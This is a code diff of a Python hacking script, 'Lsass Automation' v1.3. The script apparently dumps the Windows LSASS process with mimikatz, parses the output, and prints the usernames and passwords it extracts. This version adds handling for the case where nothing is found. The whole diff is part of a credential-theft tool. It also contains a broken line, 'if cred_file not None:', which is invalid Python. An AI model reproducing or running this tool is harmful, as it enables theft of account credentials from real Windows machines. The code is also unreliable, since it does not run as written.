@@ -19,10 +19,10 @@ $$ |       $$  $$<  $$ |  $$ | $$ |$$\ $$ |$$ |
 $$$$$$$$\ $$  /\$$\ \$$$$$$  | \$$$$  |$$ |\$$$$$$$\ 
 \________|\__/  \__| \______/   \____/ \__| \_______|
                                                      
-Lsass Automation! Made by Exotic!! v1.2                                                     
+Lsass Automation! Made by Exotic!! v1.3                                                     
                                                      
 """
-    return banner
+    return banner 
 
 def load_animation():
     global status
@@ -110,8 +110,12 @@ def mimi_examine():
                     if not (mimi_file[i].strip("*") in cred_list):
                         cred_list.append(mimi_file[i].lstrip('*'))
                         cred_list.append(mimi_file[i + 2].lstrip('*'))
-        print("[+] Found Credential!\n")
-        return cred_list
+        if len(cred_list) > 0:
+            print("[+] Found Credential!\n")
+            return cred_list
+        else:
+            print("[?] No Credentials found!")
+            return
     except Exception as e:
         print("[-] Something went wrong.. ",e)
         exit(0)
@@ -145,11 +149,12 @@ def main():
     mimikatz_dumping(lsass_path, current_dir)
     os.chdir(current_dir)
     cred_file = mimi_examine()
-    for cred in cred_file:
-        if cred.startswith('Username:'):
-            print('\n')
-        print(cred)
-    print('\n')
+    if cred_file not None:
+        for cred in cred_file:
+            if cred.startswith('Username:'):
+                print('\n')
+            print(cred)
+        print('\n')
 
 if __name__ == "__main__":
     main()
